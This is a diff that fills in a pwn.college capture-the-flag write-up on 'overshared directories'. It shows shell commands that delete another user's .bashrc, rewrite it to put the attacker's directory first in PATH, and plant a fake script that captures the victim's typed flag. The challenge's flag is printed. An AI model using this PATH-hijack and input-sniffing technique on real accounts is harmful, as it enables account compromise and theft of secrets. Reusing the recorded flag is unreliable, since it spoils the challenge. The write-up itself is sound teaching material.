@@ -47,17 +47,27 @@
 
 
   # **3.<ins>Overshared directories</ins>**:-
-   The challenge asks us to 
+   The challenge asks us to replicate the previous attack with write access to `/home/zardus` instead of `/home/zardus/.bashrc`.
 ## My solve:-
-   **My flag** :-``
+   **My flag** :-`pwn.college{omQWwZl8XhmRLdPsPd81z7iBacw.0FM0EzNxwCNxAzNzEzW}`
 
-   So, the challenge asked us to
+   So, the challenge asked us to replicate the previous attack with write access to `/home/zardus` instead of `/home/zardus/.bashrc`, hence i opened the shell and then created a script `flag_checker` which prompts "Type the flag" and then cas the entered flag and stored it it `/home/hacker`, then i removed the orginal `/home/zardus/.bashrc` and created a new `/home/zardus/.bashrc` and inserted this directory to his `PATH` by using output redirection on `echo export PATH="/home/hacker:$PATH"`, and then ran `/challenge/victim` and got the flag.
    ```bash
-  
+   hacker@shenanigans~sniffing-input:~$  nano flag_checker
+   hacker@shenanigans~overshared-directories:~$ rm /home/zardus/.bashrc
+   rm: remove write-protected regular file '/home/zardus/.bashrc'? y
+   hacker@shenanigans~overshared-directories:~$ echo 'export PATH="/home/hacker:$PATH"' > /home/zardus/.bashrc
+   hacker@shenanigans~overshared-directories:~$ /challenge/victim
+   Username: zardus
+   Password: **********
+   zardus@shenanigans~overshared-directories:~$ flag_checker
+   Type the flag, victim:
+   *************************************************************pwn.college{omQWwZl8XhmRLdPsPd81z7iBacw.0FM0EzNxwCNxAzNzEzW}
+   exit
    ```
 
 ### What i learned:-
-   I learned that 
+   I learned that the problem is that a subtlety of Linux file/directory permissions is that anyone with write access to a directory can move and delete files in it. 
 
 ### Refference :-
    None
